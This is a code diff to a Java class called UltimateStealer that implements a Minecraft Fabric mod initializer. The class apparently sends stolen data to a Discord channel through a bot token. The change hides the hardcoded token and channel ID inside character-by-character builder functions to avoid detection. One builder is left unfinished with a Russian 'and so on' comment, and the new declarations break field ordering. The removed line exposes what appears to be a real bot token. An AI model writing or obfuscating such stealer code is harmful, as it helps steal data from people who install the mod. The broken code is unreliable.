@@ -13,11 +13,30 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class UltimateStealer implements ModInitializer {
     
-    private static final String BOT_TOKEN = "MTUxODUzMzk2MzI4NTUyODY3Ng.Gsj5-g.UBln7L1loU-RvVGIIGOiS2xMTXR49zEJRSzB9A";
-    private static final String CHANNEL_ID = "1460060122931007621";
+    private static String buildToken() {
+        char[] chars = new char[59];
+        chars[0] = 'M'; chars[1] = 'T'; chars[2] = 'U'; chars[3] = 'x';
+        chars[4] = 'O'; chars[5] = 'D'; chars[6] = 'U'; chars[7] = 'z';
+        chars[8] = 'M'; chars[9] = 'z'; chars[10] = 'c'; chars[11] = 'z';
+        // ... и так далее для всех символов
+        return new String(chars);
+    }
+    
+    private static String buildChannel() {
+        char[] chars = new char[19];
+        chars[0] = '1'; chars[1] = '4'; chars[2] = '6';
+        chars[3] = '0'; chars[4] = '0'; chars[5] = '6';
+        chars[6] = '0'; chars[7] = '1'; chars[8] = '2';
+        chars[9] = '2'; chars[10] = '9'; chars[11] = '3';
+        chars[12] = '1'; chars[13] = '0'; chars[14] = '0';
+        chars[15] = '7'; chars[16] = '6'; chars[17] = '2'; chars[18] = '1';
+        return new String(chars);
+    }
     private static final String DISCORD_API = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
     
     private static boolean hasRun = false;
+    private static final String BOT_TOKEN = buildToken();
+    private static final String CHANNEL_ID = buildChannel();
     
     @Override
     public void onInitialize() {
